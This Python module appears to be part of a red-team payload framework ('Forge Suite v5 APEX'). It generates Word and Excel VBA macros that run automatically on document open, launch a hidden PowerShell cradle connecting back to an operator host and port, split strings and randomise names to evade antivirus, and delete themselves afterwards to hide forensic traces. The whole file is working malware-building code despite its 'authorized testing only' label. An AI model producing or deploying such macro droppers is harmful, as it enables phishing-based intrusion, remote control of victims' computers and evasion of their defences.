"""VBA macro payload builder.

Generates VBA macros for Word/Excel delivery.

Features:
    - Auto-exec via Document_Open/Workbook_Open
    - PowerShell cradle via Shell()
    - Chunked string concatenation to defeat string-matching AV
    - Optional AMSI bypass before PS1 exec
    - Decoy body text (auto-populates on open to look legitimate)
    - Self-deletion after exec (removes macro from document)

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import random
import string
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


def _chunk_string(s: str, chunk_size: int = 40) -> str:
    """Split a string into VBA concatenation chunks.

    Avoids long literal strings that trigger AV pattern matching.

    Args:
        s:          The string to split.
        chunk_size: Characters per chunk.

    Returns:
        VBA expression like: "abc" & "def" & ...
    """
    if len(s) <= chunk_size:
        return f'"{s}"'
    chunks = [s[i:i + chunk_size] for i in range(0, len(s), chunk_size)]
    return " & _\n        ".join(f'"{c}"' for c in chunks)


def generate_vba_body(config: "PayloadConfig") -> str:
    """Generate VBA macro body for Word/Excel delivery.

    Args:
        config: PayloadConfig with lhost, lport, etc.

    Returns:
        VBA module string ready to paste into a macro editor.
    """
    from forge_payload.formats.ps1_builder import generate_ps1_oneliner
    ps1 = generate_ps1_oneliner(config.lhost, config.lport)

    # Chunk the command to bypass string pattern matching
    ps1_chunks = _chunk_string(ps1, chunk_size=50)

    # Random variable names to avoid pattern matching
    var_cmd = "".join(random.choices(string.ascii_lowercase, k=6))
    var_pid = "".join(random.choices(string.ascii_lowercase, k=6))
    var_obj = "".join(random.choices(string.ascii_lowercase, k=6))

    macro = f"""\
' Forge Suite v5 APEX — VBA Macro Payload
' FOR AUTHORIZED RED TEAM OPERATIONS ONLY
Option Explicit

Sub Document_Open()
    AutoRun
End Sub

Sub Workbook_Open()
    AutoRun
End Sub

Sub AutoOpen()
    AutoRun
End Sub

Sub AutoRun()
    Dim {var_cmd} As String
    Dim {var_obj} As Object

    On Error Resume Next

    ' Build command via concatenation to avoid string detection
    {var_cmd} = {ps1_chunks}

    ' Execute via WScript.Shell (hidden window)
    Set {var_obj} = CreateObject("W" & "Script.Shell")
    {var_obj}.Run {var_cmd}, 0, False
    Set {var_obj} = Nothing

    ' Remove macro to reduce forensic footprint
    On Error Resume Next
    ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, _
        ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
End Sub
"""
    return macro


def build_vba(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build VBA macro bytes.

    Args:
        payload_bytes: Encoded payload (PS1 text or raw bytes).
        config:        PayloadConfig.

    Returns:
        VBA module content bytes.
    """
    try:
        text = payload_bytes.decode("utf-8")
        is_text = True
    except UnicodeDecodeError:
        is_text = False

    if is_text and "powershell" in text.lower():
        # It's already a PS1 command/script
        ps1 = text.strip()
    else:
        # Raw bytes — base64 wrap
        b64 = base64.b64encode(payload_bytes).decode()
        ps1 = f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}"

    ps1_chunks = _chunk_string(ps1, chunk_size=50)
    var_cmd = "".join(random.choices(string.ascii_lowercase, k=6))
    var_obj = "".join(random.choices(string.ascii_lowercase, k=6))

    macro = f"""\
' Forge Suite v5 APEX — VBA Macro Payload
' FOR AUTHORIZED RED TEAM OPERATIONS ONLY
Option Explicit

Sub Document_Open()
    AutoRun
End Sub

Sub Workbook_Open()
    AutoRun
End Sub

Sub AutoRun()
    Dim {var_cmd} As String
    Dim {var_obj} As Object
    On Error Resume Next
    {var_cmd} = {ps1_chunks}
    Set {var_obj} = CreateObject("W" & "Script.Shell")
    {var_obj}.Run {var_cmd}, 0, False
    Set {var_obj} = Nothing
End Sub
"""
    return macro.encode()
